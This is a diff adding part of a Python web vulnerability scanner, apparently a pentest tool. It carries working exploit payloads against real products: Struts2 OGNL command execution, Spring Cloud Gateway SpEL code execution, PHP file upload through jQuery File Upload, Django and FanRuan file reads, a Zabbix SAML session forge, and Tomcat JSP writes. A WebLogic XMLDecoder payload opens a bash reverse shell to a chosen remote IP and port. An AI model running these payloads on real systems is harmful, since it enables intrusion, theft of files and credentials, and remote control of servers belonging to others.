+            response = requests.post(url=url, headers=xxe_header, data=xml, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy)
+            end_time = time.time()
+            xxe_time = end_time - start_time
+
+            # 判断响应时间是否异常
+            if xxe_time > (normal_time * 2) or "root:" in response.text:
+                with open('./result/xxe.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "xxe")
+
+    def _struts(self, url):
+        host = url
+        cmd = "ping"
+        ognl_payload = "${"
+        ognl_payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
+        ognl_payload += "(#cmd='{}').".format(cmd)
+        ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+        ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
+        ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+        ognl_payload += "(#p.redirectErrorStream(true))."
+        ognl_payload += "(#process=#p.start())."
+        ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+        ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+        ognl_payload += "(#ros.flush())"
+        ognl_payload += "}"
+
+        # encode the payload
+        ognl_payload_encoded = requests.utils.quote(ognl_payload)
+
+        # further encoding
+        url = "{}/{}/help.action".format(host, ognl_payload_encoded.replace("+", "%20").replace(" ", "%20").replace("%2F", "/"))
+
+        try:
+            response = requests.get(url=url, timeout=5, verify=gl_verify, cookies=gl_cookie, headers=self._header, proxies=gl_proxy)
+        except requests.exceptions.RequestException as e:
+            pass
+            return
+
+        if response.status_code == 200 and "ping" in response.text:
+            # 使用subprocess库执行命令
+            try:
+                output = subprocess.check_output(cmd, shell=True)
+            except Exception as e:
+                pass
+            with open('./result/struts.txt', 'a') as w:
+                w.write(url + '\n')
+        else:
+            pass
+
+    def _struts2(self, url):
+        cmd = "ping"
+        payload = "%{(#_='multipart/form-data')."
+        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+        payload += "(#_memberAccess?"
+        payload += "(#_memberAccess=#dm):"
+        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+        payload += "(#ognlUtil.getExcludedClasses().clear())."
+        payload += "(#context.setMemberAccess(#dm))))."
+        payload += "(#cmd='%s')." % cmd
+        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
+        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+        payload += "(#ros.flush())}"
+
+        try:
+            struts_headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+            res = requests.post(url, headers=struts_headers, data={}, verify=gl_verify, proxies=gl_proxy)
+            if res.status_code == 200 and "ping" in res.text:
+                with open('./result/struts.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _struts_work(self, url, threads):
+        print(f"[{current_time}][-] 开始Struts漏洞检测......")
+        work_list = [
+            self._struts,
+            self._struts2
+        ]
+        time.sleep(1)
+        with tqdm(total=len(work_list), desc='Struts检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(job, url) for job in work_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(None, "Struts")
+
+    def _cmd(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, timeout=3, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy)
+            response.encoding = response.apparent_encoding
+            if "ping" in response.text:
+                with open('./result/cmd.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _cmd_work(self, link_list, threads):
+        print(f"[{current_time}][-] 开始Cmd命令执行检测......")
+        new_url_list = []
+        for url in link_list:
+            counts = url.count('=')
+            for num in range(1, counts + 1):
+                cmd_url = url.replace(url.split('=')[num].split('&' or '/')[0], 'ping')
+                new_url_list.append(cmd_url)
+        time.sleep(1)
+        with tqdm(total=len(new_url_list), desc='Cmd命令执行检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._cmd, url) for url in new_url_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(None, "Cmd命令执行")
+
+    def _spring(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, verify=gl_verify, timeout=2, cookies=gl_cookie, proxies=gl_proxy)
+            response.encoding = response.apparent_encoding
+            if response.status_code == 200 and "404" not in response.text:
+                with open('./result/spring.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _spring_work(self, url, threads):
+        print(f'[{current_time}][-] 开始扫描spring信息......')
+        spring_list = []
+        with open('./data/spring.txt', 'r') as spring_dict:
+            spring_dict.seek(0)
+            spring_lines = spring_dict.readlines()
+            for lines in spring_lines:
+                spring_list.append(lines.strip())
+        time.sleep(1)
+        with tqdm(total=len(spring_lines), desc='Spring信息检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._spring, url + payload) for payload in spring_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Spring信息")
+
+    def _spring_rce(self, url):
+        print(f'[{current_time}][-] 开始检测spring漏洞......')
+        command = "ping"
+        headers = {"Content-Type": "application/json", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', 'Accept': '*/*'}
+        id = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
+        payload = {"id": id, "filters": [
+            {"name": "AddResponseHeader",
+             "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022" + command + "\u0022).getInputStream()))}"}}],
+                   "uri": "http://example.com"}
+
+        commandb64 = base64.b64encode(command.encode('utf-8')).decode('utf-8')
+        try:
+            rbase = requests.post(url + '/actuator/gateway/routes/' + id, headers=headers, data=json.dumps(payload), verify=gl_verify, proxies=gl_proxy)
+            if (rbase.status_code == 201):
+                print("[+] Stage deployed to /actuator/gateway/routes/" + id)
+                r = requests.post(url + '/actuator/gateway/refresh', headers=headers, verify=gl_verify, proxies=gl_proxy)
+                if (r.status_code == 200):
+                    r = requests.get(url + '/actuator/gateway/routes/' + id, headers=headers, verify=gl_verify, proxies=gl_proxy)
+                    if (r.status_code == 200):
+                        with open('./result/spring.txt', 'a') as w:
+                            w.write(url + '/actuator/gateway/routes/' + id + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "Spring漏洞")
+
+    def _ssit(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, verify=gl_verify, cookies=gl_cookie, timeout=2, proxies=gl_proxy)
+            if response.status_code == 200 and "9801" in response.text:
+                with open('./result/moban.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _ssit_work(self, link_list, threads):
+        print(f"[{current_time}][-] 开始检测模版注入......")
+        # ${{<%[%'"}}%\
+        payloads = ['{{99*99}}', '${{99*99}}', '$eval("99*99")', "{{99*'99'}}"]
+        new_url_list = []
+        for url in link_list:
+            counts = url.count('=')
+            for payload in payloads:
+                for num in range(1, counts + 1):
+                    mb_url = url.replace(url.split('=')[num].split('&' or '/')[0], payload)
+                    if "http" in mb_url:
+                        new_url_list.append(mb_url)
+        if new_url_list:
+            time.sleep(1)
+            with tqdm(total=len(new_url_list), desc='模版注入检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+                with ThreadPoolExecutor(threads) as pool:
+                    try:
+                        futures = [pool.submit(self._ssit, url) for url in new_url_list]
+                    except Exception as e:
+                        pass
+                    for future in concurrent.futures.as_completed(futures):
+                        future.result()
+                        pbar.update(1)
+                wait(futures)
+            time.sleep(1)
+            self._point_out(futures, "模版注入")
+
+    def _swagger(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, verify=gl_verify, cookies=gl_cookie, timeout=2, proxies=gl_proxy)
+            if response.status_code == 200:
+                with open('./result/swagger.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _swagger_work(self, threads):
+        print(f"[{current_time}][-] 开始扫描swagger信息......")
+        swger_list = []
+        with open('./data/swagger.txt', 'r') as swger_str:
+            swger_str.seek(0)
+            swger_lines = swger_str.readlines()
+            for dir in swger_lines:
+                swger_list.append(dir.strip())
+        time.sleep(1)
+        with tqdm(total=len(swger_list), desc='扫描Swagger信息进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._swagger, url) for url in swger_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Swagger信息")
+
+    def _json_url_check(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            if response.status_code == 200:
+                with open('./result/json.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _json_url_check_work(self, threads):
+        print(f"[{current_time}][-] 开始扫描json文件......")
+        time.sleep(1)
+        js_url_list = []
+        new_url_list = []
+        try:
+            with open('./result/js.txt', 'r') as js_str:
+                js_str.seek(0)
+                js_lines = js_str.readlines()
+                for url in js_lines:
+                    if url not in js_url_list:
+                        js_url_list.append(url.strip())
+        except Exception as e:
+            pass
+        if js_url_list:
+            for url in js_url_list:
+                json_url = url.replace('.js', '.json')
+                new_url_list.append(json_url)
+            time.sleep(1)
+            with tqdm(total=len(new_url_list), desc='Json信息进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+                with ThreadPoolExecutor(threads) as pool:
+                    try:
+                        futures = [pool.submit(self._json_url_check, url) for url in new_url_list]
+                    except Exception as e:
+                        pass
+                    for future in concurrent.futures.as_completed(futures):
+                        future.result()
+                        pbar.update(1)
+                wait(futures)
+            time.sleep(1)
+            self._point_out(futures, "Json信息")
+
+    def _cors(self, url):
+        print(f"[{current_time}][-] 开始检测cors漏洞......")
+        origin = 'http://www.test.com'
+        cors_headers = {'Origin': 'http://www.test.com'}
+        try:
+            response = requests.get(url=url, headers=cors_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            res = response.headers.get('Access-Control-Allow-Origin')
+            if response.status_code == 200 and res == origin:
+                with open('./result/cors.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+        try:
+            response2 = requests.post(url=url, headers=cors_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            res2 = response2.headers.get("Access-Control-Allow-Origin")
+            if response2.status_code == 200 and origin == res2:
+                print(f"[!] CORS misconfiguration found in POST request: {response2.headers}")
+        except Exception as e:
+            pass
+        time.sleep(1)
+        self._point_out(None, "cors")
+
+    def _shiro(self, url):
+        print(f"[{current_time}][-] 开始验证是否使用shiro......")
+        shiro_cookies = {"rememberMe": "xxxxx"}
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=shiro_cookies, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            res = response.cookies
+            if "rememberMe" in res:
+                with open('./result/shiro.txt', 'a') as w:
+                    w.write(url + '/n')
+        except Exception as e:
+            pass
+        time.sleep(1)
+        self._point_out(None, "shiro")
+
+    def _ssrf(self, url):
+        print(f'[{current_time}][-] 开始检测ssrf漏洞......')
+        # 定义一些测试用例，用于检测是否存在SSRF漏洞
+        test_cases = [
+            {'url': 'http://127.0.0.1'},
+            {'url': 'http://localhost'},
+            {'url': 'http://example.net'},
+            {'url': 'http://invalid.com'},
+            {'url': 'http://example.com', 'dns': '8.8.8.8'},
+            {'url': 'http://example.com:22'},
+            {'url': 'http://example.com/admin', 'method': 'POST'},
+            {'url': 'http://example.com/', 'headers': {'X-Forwarded-For': '127.0.0.1'}},
+            {'url': 'http://example.com', 'data': 'secret'},
+        ]
+
+        # 遍历所有测试用例，向目标URL发送请求，并检查响应结果是否包含预期字符串
+        for test_case in test_cases:
+            try:
+                response = requests.request(method=test_case.get('method', 'GET'),
+                                            url=url,
+                                            proxies=gl_proxy,
+                                            verify=gl_verify,
+                                            params={'url': test_case['url']},
+                                            headers=test_case.get('headers'),
+                                            data=test_case.get('data'),
+                                            timeout=5)
+                if 'Connection refused' in response.text or 'Could not resolve host' in response.text:
+                    with open('./result/ssrf.txt', 'a') as w:
+                        w.write(url + '\n')
+
+            except Exception as e:
+                pass
+        self._point_out(None, "ssrf")
+
+    def _node_js(self, url):
+        print(f'[{current_time}][-] 开始检测Node.js漏洞......')
+        new_url = url + "/api/getServices?name[]=$(echo -e 'zeeker' > test.txt)"
+        try:
+            response = requests.get(url=new_url, headers=self._header, verify=gl_verify, cookies=gl_cookie, timeout=3, proxies=gl_proxy)
+            if response.status_code == 200 and "test.txt" in response.text:
+                with open('./result/nodejs.txt', 'a') as w:
+                    w.write(new_url + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "Node.js")
+
+    def _apisix(self, url):
+        print(f"[{current_time}][-] 开始检测Apisix漏洞......")
+        target = url
+        token = token_hex(10)
+        uris = ['/apisix/batch-requests', '/api-gw/batch']
+        hits = [f'failed to load plugin {token}']
+        data = {"headers": {'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1', 'X-Real-IP': '127.0.0.1'},
+                'pipeline': [{'path': f'/apisix/admin/plugins/{token}'}]}
+
+        try:
+            targets = ['{}{}'.format(target, uri) for uri in uris]
+            with requests.Session() as session:
+                for target in targets:
+                    response = session.post(target, timeout=10, json=data, verify=gl_verify, proxies=gl_proxy)
+                    for hit in hits:
+                        if hit in response.text:
+                            with open('./result/apisix.txt', 'a') as w:
+                                w.write(target + '/n')
+        except Exception as e:
+            pass
+
+        self._point_out(None, "Apisix")
+
+    def _juqery(self, url):
+        print(f"[{current_time}][-] 开始检测Juqery文件写入漏洞......")
+        burp0_url = f"{url}/assets/plugins/jquery-file-upload//server/php/index.php"
+
+        burp0_cookies = {"PHPSESSID": "0i5ht16te77l0rvv1o6p1vd49u"}
+
+        burp0_headers = {"Content-Type": "multipart/form-data; boundary=a211583f728c46a09ca726497e0a5a9f", "Accept": "*/*", "Accept-Encoding": "gzip,deflate",
+                         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21", "Connection": "Keep-alive"}
+        burp0_data = "--a211583f728c46a09ca726497e0a5a9f\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"jqueryfileupload_poc.php\"\r\n\r\n<?php phpinfo();?>\r\n--a211583f728c46a09ca726497e0a5a9f--"
+        try:
+            rsp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=gl_proxy, verify=gl_verify)
+
+            shell_addr = json.loads(rsp.content)['files'][0]['url']
+            with open('./result/juqery.txt', 'a') as w:
+                w.write(shell_addr + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "Juqery文件写入")
+
+    def _django(self, url):
+        print(f"[{current_time}][-] 开始检测Django文件读取漏洞......")
+        new_url = url + "/admin/doc/templates//etc/passwd/"
+        try:
+            response = requests.get(url=new_url, headers=self._header, verify=gl_verify, cookies=gl_cookie, timeout=3, proxies=gl_proxy).text
+            if "root:" in response:
+                with open('./result/django.txt', 'a') as w:
+                    w.write(new_url + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "Django文件读取")
+
+    # 帆软目录遍历
+    def _fanruan_mlbl(self, url):
+        new_url = url + "/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../..&currentUserName=admin&currentUserId=1&isWebReport=true"
+        try:
+            response = requests.get(url=new_url, cookies=gl_cookie, verify=gl_verify, timeout=3, headers=self._header, proxies=gl_proxy)
+            if "XML" in response.text:
+                with open('./result/fanruan.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    # 帆软文件读取
+    def _fanrun_wjdq(self, url):
+        new_url = url + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+        try:
+            response = requests.get(url=new_url, cookies=gl_cookie, verify=gl_verify, timeout=3, headers=self._header, proxies=gl_proxy)
+            if "xml" in response.text:
+                with open('./result/fanruan.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    # 待验证xml判断
+    def _fanruan_work(self, url, threads):
+        print(f'[{current_time}][-] 开始检测帆软漏洞......')
+        work_list = [self._fanruan_mlbl, self._fanruan_mlbl]
+        time.sleep(1)
+        with tqdm(total=len(work_list), desc='帆软漏洞检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(work, url) for work in work_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "帆软漏洞")
+
+    def _jsonp(self, url):
+        sensitive_info = "username"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+            "Referer": url
+        }
+        # 发送 JSONP 请求并获取响应
+        try:
+            response = requests.get(url, headers=headers, timeout=3, verify=gl_verify, cookies=gl_cookie, proxies=gl_proxy)
+            response.raise_for_status()  # 检查响应状态码
+            if response.status_code == 200 and sensitive_info in response.text:
+                with open('./result/jsonp.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _jsonp_work(self, url, threads):
+        print(f"[{current_time}][-] 开始检测Jsonp漏洞......")
+        jsonp_url_list = []
+        jsonp_list = [
+            '_callback',
+            '_cb',
+            'callback',
+            'cb',
+            'jsonp',
+            'jsonpcallback',
+            'jsonpcb',
+            'jsonp_cb',
+            'json',
+            'jsoncallback',
+            'jcb',
+            'call',
+            'callBack',
+            'jsonpCallback',
+            'jsonpCb',
+            'jsonp_Cb',
+            'jsonCallback',
+            'ca',
+        ]
+        json_callback = "callback_function_name"
+        sensitive_info = "username"
+
+        # 构造 JSONP 请求的 URL
+        json_params = urllib.parse.urlencode({"sensitive_info": sensitive_info})
+        for poc in jsonp_list:
+            jsonp_url = f"{url}/?{poc}={json_callback}&{json_params}"
+            jsonp_url_list.append(jsonp_url)
+        time.sleep(1)
+        with tqdm(total=len(jsonp_url_list), desc='Jsonp检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._jsonp, res_url) for res_url in jsonp_url_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(None, "Jsonp漏洞")
+
+    def _jboss(self, url):
+        try:
+            response = requests.get(url=url, headers=gl_headers, verify=gl_verify, cookies=gl_cookie, timeout=3, proxies=gl_proxy)
+            if response.status_code == 200 and '404' not in response.text:
+                with open('./result/jboss.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _jboss_work(self, url, threads):
+        print(f'[{current_time}][-] 开始检测Jboss未授权......')
+        jb_url_list = []
+        prot_list = ['8080', '4457', '1099', '8443']
+        for port in prot_list:
+            jb_url = url + f':{port}/jmx-console'
+            jb_url_list.append(jb_url)
+        time.sleep(1)
+        with tqdm(total=len(jb_url_list), desc='Jboss未授权检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._jboss, url) for url in jb_url_list]
+                except Exception as e:
+                    pass
+                for futrue in concurrent.futures.as_completed(futures):
+                    futrue.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Jboss未授权")
+
+    def _zabbix(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy, timeout=3)
+            cookie = response.headers.get("Set-Cookie")
+            sessionReg = re.compile("zbx_session=(.*?);")
+            session = re.findall(sessionReg, cookie)[0]
+            base64_decode = base64.b64decode(urllib.parse.unquote(session, encoding="utf-8"))
+            session_json = json.loads(base64_decode)
+            payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":"%s","sign":"%s"}' % (session_json["sessionid"], session_json["sign"])
+            payload_encode = urllib.parse.quote(base64.b64encode(payload.encode()))
+            with open('./result/zabbix.txt', 'a') as w:
+                w.write(url + "\n未加密Payload：" + payload + "\n加密后Payload：" + payload_encode + '\n')
+        except Exception as e:
+            pass
+
+    def _zabbix_work(self, url, threads):
+        print(f'[{current_time}][-] 开始检测Zabbix-Saml漏洞.....')
+        ports = ['10050', '10051']
+        url_list = []
+        for port in ports:
+            zb_url = url + f':{port}'
+            url_list.append(zb_url)
+        time.sleep(1)
+        with tqdm(total=len(url_list), desc='Zabbix未授权检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._zabbix, res_url) for res_url in url_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Zabbix-Saml漏洞")
+
+    def _joomla(self, url):
+        new_url = url + '/api/index.php/v1/config/application?public=true'
+        try:
+            response = requests.get(url=new_url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=3)
+            if response.status_code == 200:
+                with open('./result/joomla.txt', 'a') as w:
+                    w.write(new_url + '\n')
+        except Exception as e:
+            pass
+
+    def _xssi(self, url):
+        try:
+            xssi_payload = ")]}';\n"
+            headers = {"Content-Type": "application/json"}
+            response = requests.post(url=url, data=xssi_payload, headers=headers, verify=gl_verify, cookies=gl_cookie, proxies=gl_proxy)
+            if ")]}';" in response.text:
+                with open('./result/xssi.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _weblogic(self, url):
+        res_url = ''
+        try:
+            response = requests.get(url=url, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=3)
+            if response.status_code == 200 and 'error' not in response.text:
+                res_url = url
+                with open('./result/weblogic.txt', 'a') as w:
+                    w.write(url + '文件写入路径:/bea_wls_internal/mac.jsp，如果hello存在则存在漏洞\n')
+        except Exception as e:
+            pass
+        return res_url
+
+    def _weblogic_shell(self, url, choose):
+        web_header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Content-Type": "text/xml"}
+        web_xml = """
+                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+                    <soapenv:Header>
+                    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+                    <java><java version="1.4.0" class="java.beans.XMLDecoder">
+                    <object class="java.io.PrintWriter">
+                    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp</string>
+                    <void method="println">
+                <string>
+                    <![CDATA[
+                <% out.print("hello"); %>
+                    ]]>
+                    </string>
+                    </void>
+                    <void method="close"/>
+                    </object></java></java>
+                    </work:WorkContext>
+                    </soapenv:Header>
+                    <soapenv:Body/>
+                </soapenv:Envelope>
+                """
+        if choose == 'w':
+            try:
+                response = requests.get(url=url, headers=web_header, proxies=gl_proxy, data=web_xml, cookies=gl_cookie, verify=gl_verify, timeout=5)
+                if response.status_code == 200 and 'error' not in response.text:
+                    print(f'[{current_time}][*] 文件已经写入:{url}')
+                    with open('./result/weblogic.txt', 'a') as w:
+                        w.write(url + '文件写入路径:%s/bea_wls_internal/mac.jsp，如果hello存在则存在漏洞\n' % url)
+            except Exception as e:
+                pass
+        elif choose == 'n':
+            ip = str(input(f'[{current_time}][*] 远程IP:'))
+            port = str(input(f'[{current_time}][*] 远程端口:'))
+            web_nc = f"""
+                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
+                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+                <java version="1.4.0" class="java.beans.XMLDecoder">
+                <void class="java.lang.ProcessBuilder">
+                <array class="java.lang.String" length="3">
+                <void index="0">
+                <string>/bin/bash</string>
+                </void>
+                <void index="1">
+                <string>-c</string>
+                </void>
+                <void index="2">
+                <string>bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1</string>
+                </void>
+                </array>
+                <void method="start"/></void>
+                </java>
+                </work:WorkContext>
+                </soapenv:Header>
+                <soapenv:Body/>
+                </soapenv:Envelope>
+            """
+            try:
+                response = requests.get(url=url, headers=web_header, proxies=gl_proxy, data=web_nc, cookies=gl_cookie, verify=gl_verify, timeout=5)
+                if response.status_code == 200 and 'error' not in response.text:
+                    print(f'[{current_time}][*] 远程监听已成功执行')
+            except Exception as e:
+                pass
+
+    def _weblogic_work(self, url, threads):
+        print(f'[{current_time}][-] 开始检测Weblogic漏洞......')
+        res_list = []
+        dir_list = [
+            '/wls-wsat/CoordinatorPortType',
+            '/wls-wsat/RegistrationPortTypeRPC',
+            '/wls-wsat/ParticipantPortType',
+            '/wls-wsat/RegistrationRequesterPortType',
+            '/wls-wsat/CoordinatorPortType11',
+            '/wls-wsat/RegistrationPortTypeRPC11',
+            '/wls-wsat/ParticipantPortType11',
+            '/wls-wsat/RegistrationRequesterPortType11',
+            '/_async/AsyncResponseService',
+            '/_async/AsyncResponseServiceJms',
+            '/_async/AsyncResponseServiceHttps'
+        ]
+        port_list = ['7001', '8443', '8001']
+        time.sleep(1)
+        with tqdm(total=len(dir_list) * len(port_list), desc='Weblogic检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._weblogic, url + ':' + port + dir) for dir in dir_list for port in port_list]
+                except Exception as e:
+                    pass
+            for future in concurrent.futures.as_completed(futures):
+                res_list.append(future.result())
+                pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Weblogic")
+        # self._weblogic_nc(res_list)
+
+    # nc未完善
+    def _weblogic_nc(self,res_list):
+        if res_list:
+            choose = input(f'[{current_time}][!] 检测到weblogic目录文件，是否尝试写入文件/远程监听/退出weblogic操作(w/n/exit)?')
+            for url in res_list:
+                if choose.lower() == 'w':
+                    self._weblogic_shell(url, choose)
+                elif choose.lower() == 'n':
+                    self._weblogic_shell(url, choose)
+                else:
+                    break
+
+
+    def _tomcat(self, url):
+        data = 'hello,cve-2017-12615'
+        try:
+            response = requests.put(url + '/1.jsp/', data=data, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response_end = requests.get(url + '/1.jsp', headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response_end.encoding = response_end.apparent_encoding
+            if response_end.status_code == 200 and 'cve-2017-12615' in response_end.text:
+                with open('./result/tomcat.txt', 'a') as w:
+                    w.write("tomcat文件put写入地址:%s" % url + '/1.jsp\n')
+        except Exception as e:
+            pass
+
+    def _tomcat2(self, url):
+        parems_url = f"{url}/cgi-bin/test.bat?&C:/Windows/System32/net+user"
+        try:
+            response = requests.get(parems_url, headers=self._header, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
+            response.encoding = response.apparent_encoding
+            if response.status_code == 200 and '用户账户' in response.text:
+                with open('./result/tomcat.txt', 'a') as w:
+                    w.write("tomcat命令执行net+user:%s" % parems_url + '\n')
+        except Exception as e:
+            pass
+
+    def _tomcat_work(self, url, thread):
+        print(f"[{current_time}][-] 开始检测Tomcat漏洞......")
+        work_list = [self._tomcat, self._tomcat2]
+        time.sleep(1)
+        with tqdm(total=len(work_list), desc='Weblogic检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(thread,url) as pool:
+                try:
+                    futures = [pool.submit(job, url) for job in work_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Tomcat")
+
+    def _express(self, url):
+        try:
